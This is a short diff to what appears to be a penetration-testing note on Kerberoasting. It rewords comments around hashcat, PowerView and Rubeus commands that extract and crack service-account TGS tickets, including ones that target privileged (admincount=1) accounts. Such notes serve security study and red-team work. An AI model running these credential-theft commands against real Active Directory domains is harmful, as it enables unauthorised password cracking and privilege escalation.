@@ -121,7 +121,7 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 #### PowerView method 
 
 ```powershell
-# Using PowerView to Extract TGS Tickets
+# Using PowerView to enumrate SPNs
 import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname
 
@@ -136,13 +136,13 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 #### Rubeus method 
 
 ```powershell
-# Using the /stats Flag
+# Using the /stats Flag (get SPNs count , encryption types and latest change date)
 .\Rubeus.exe kerberoast /stats
 
 # get ticket (we can see the supported Encryption type also)
 .\Rubeus.exe kerberoast /user:testspn /nowrap
 
-# Using the /nowrap Flag
+# Using the /nowrap Flag ( nowrap flag prevents any base64 ticket blobs from being column wrapped for any function)
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
 
